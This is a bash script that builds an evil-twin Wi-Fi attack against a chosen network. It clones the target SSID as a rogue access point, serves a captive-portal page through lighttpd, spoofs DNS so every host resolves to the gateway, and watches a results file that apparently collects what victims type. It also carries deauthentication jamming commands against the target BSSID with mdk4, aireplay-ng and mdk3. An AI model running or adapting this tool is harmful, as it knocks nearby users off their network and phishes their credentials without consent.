#!/bin/bash
clear
echo
echo "1. Open firefox"
echo "2. Connect mrwifi"
echo "4. Copy/replace ssid and bssid + ENTER"
echo "5. Start deauting in firefox"
echo "6. Enter to start"
echo

read -p "Add SSID: " SSID
read -p "Add BSSID: " BSSID
CHAN="1"
IFACE=wlp9s0mon
BIFACE=wlp9s0
CREATE_APIFACE=ap0

CaptivePortalGatewayAddress="192.168.12.1"
CaptivePortalGatewayNetwork=${CaptivePortalGatewayAddress%.*}

set_bin() 
{
  # Generate configuration for a lighttpd web-server.
  echo "\
server.document-root = \"/tmp/web\"

server.modules = (
    \"mod_access\",
    \"mod_alias\",
    \"mod_accesslog\",
    \"mod_fastcgi\",
    \"mod_openssl\"
)

accesslog.filename = \"lighttpd.log\"

fastcgi.server = (
    \".php\" => (
        (
            \"bin-path\" => \"/usr/bin/php-cgi\"
        )
    )
)

server.port = 80

index-file.names = (
    \"index.htm\",
    \"index.html\",
    \"index.php\"
)

mimetype.assign = (
    \".html\" => \"text/html\",
    \".htm\" => \"text/html\",
    \".txt\" => \"text/plain\",
    \".jpg\" => \"image/jpeg\",
    \".png\" => \"image/png\",
    \".css\" => \"text/css\"
)


server.error-handler-404 = \"/\"

" >"lighttpd.conf"

  # Configure lighttpd's SSL only if we've got a certificate and its key.
  echo "\
\$SERVER[\"socket\"] == \":443\" {
    ssl.engine = \"enable\"
    ssl.pemfile = \"server.pem\"
}
" >>"lighttpd.conf"

  #dnsspoof
  echo "\
${CaptivePortalGatewayAddress}  *.*
172.217.5.238 google.com
172.217.13.78 clients3.google.com
172.217.13.78 clients4.google.com
" >"hosts"

}

set_html() 
{
    cp -R web /tmp
}

set_ssl()
{
    openssl req \
    -subj '/CN=captive.gateway.lan/O=CaptivePortal/OU=Networking/C=US' \
    -new -newkey rsa:2048 -days 365 -nodes -x509 \
    -keyout "server.pem" \
    -out "server.pem"
    chmod 400 "server.pem"
}

set_iptables()
{
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.12.1:80
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.12.1:443
    iptables -A INPUT -p udp --destination-port 53 -j ACCEPT
    iptables -A INPUT -p tcp --destination-port 443 -j ACCEPT
    iptables -A INPUT -p tcp --destination-port 80 -j ACCEPT
}

set_screen() 
{
  SCREEN_SIZE=$(xdpyinfo | grep dimension | awk '{print $4}' | tr -d "(")
  SCREEN_SIZE_X=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $1}'))
  SCREEN_SIZE_Y=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $2}'))

  NEW_SCREEN_SIZE_X=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/2}") | awk -F ',' '{print $1}') 
  NEW_SCREEN_SIZE_Y=$(echo $(awk "BEGIN {print $SCREEN_SIZE_Y/2}") | awk -F ',' '{print $1}')
  TOPLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0+0"
  TOPRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+0"
  TOP="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X+0"
  BOTTOMLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-0"
  BOTTOMRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0-0"
  BOTTOM="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X-0"

  LEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-$SCREEN_SIZE_MID_Y"
  RIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+$SCREEN_SIZE_MID_Y"
}

if [ $EUID -ne 0 ]; then # Super User Check
  echo
  echo -e "\\033[31mAborted, Run the script as root.\\033[0m";
  echo
  exit 1
fi

set_screen
set_bin
set_html
#set_ssl
#set_iptables

read -p "Setting AP: "
echo
xterm $TOPLEFT -bg black -fg "#CCCC00" \
    -title "AP Service" -e \
    ./create_ap $BIFACE $BIFACE "$SSID"_ &

read -p "Setting server: "
echo
killall lighttpd
xterm $BOTTOMLEFT -bg black -fg "#00CC00" \
    -title "lighttpd Server" -e \
    "lighttpd -D -f lighttpd.conf" &


read -p "Running DNS: "
echo
killall dnsspoof
xterm $TOPRIGHT -bg black -fg "#99CCFF" \
    -title "AP DNS Service" -e \
    "dnsspoof -i $CREATE_APIFACE -f hosts" &

airmon-ng start $BIFACE

read -p "Click to Result: "
echo
xterm $BOTTOMRIGHT -bg black -fg "#99CCFF" \
    -title "Result" -e \
    "while [ 1 ];do cat /var/www/html/result.txt; sleep 0.8; done" &


#read -p "Setting monitor AP: "
#echo
#airmon-ng start $BIFACE

########## deauth ##############
##########       ##############
if [ 1 ]; then
    #read -p "Run Jamming ssid: "
    echo
    #xterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
    #    -title "AP Jammer Service mdk4" -e \
    #    "mdk4 $IFACE d -B $BSSID" &

elif [ 0 ]; then
    xterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
        -title "AP Jammer Service " -e \
        "aireplay-ng -0 0 -a $BSSID --ignore-negative-one $IFACE" &

elif [ 0 ]; then
    xterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
        -title "AP Jammer Service " -e \
        "mdk3 $IFACE d -B $BSSID" &
fi


#airodump-ng -c "$wifbch" --bssid "$wifbmac" -w $wiftmp/hand "$wifimon" 2>/dev/null &

read -p "Enter to stop: "
echo
killall xterm
killall lighttpd
rm "hosts"
rm "lighttpd.conf"
rm "lighttpd.log"
#rm "server.pem"

airmon-ng stop $IFACE
